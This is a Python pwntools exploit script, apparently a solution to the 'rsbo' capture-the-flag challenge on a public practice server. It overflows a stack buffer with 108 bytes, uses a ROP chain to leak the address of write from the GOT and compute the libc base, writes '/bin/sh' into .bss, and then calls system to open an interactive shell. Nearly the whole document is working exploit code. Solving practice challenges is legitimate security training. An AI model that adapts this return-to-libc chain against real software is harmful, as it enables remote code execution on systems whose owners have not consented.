from pwn import *
import time

context.arch = 'i386'
context.log_level = 'debug'

debug = 0
elf = ELF( './rsbo-01c51ca9a7b9db3d69289c6dbb1cd758' )

if debug:
	libc = ELF( '/lib/i386-linux-gnu/libc.so.6' )
	p = elf.process()
else:
	libc = ELF( './libc-2.23.so.i386' )
	p = remote( 'hackme.inndy.tw', 7706 )

write_plt = elf.plt['write']
read_plt = elf.plt['read']
write_got = elf.got['write']
bss = elf.bss()
entry = 0x08048490
pop_pop_pop_ret = 0x0804879d

payload = b'\x00' * 108
rop1 = flat( [ write_plt, entry, 1, write_got, 4 ] )
p.send( payload + rop1 )

write_add = u32( p.recv(4) )
#p.send( b'/bin/sh\x00' )
success( 'write address: {}'.format( hex( write_add ) ) )
libc.address = write_add - libc.symbols['write']
success( 'libc address: {}'.format( hex( libc.address ) ) )
system_add = libc.symbols['system']
#p.send( b'/bin/sh\x00' )
rop2 = flat( [ read_plt, entry, 0, bss, 0x8 ] )
p.send( payload + rop2 )
p.send( b'/bin/sh\x00' )

rop3 = flat( system_add, entry, bss )
p.send( payload + rop3 )

p.interactive()
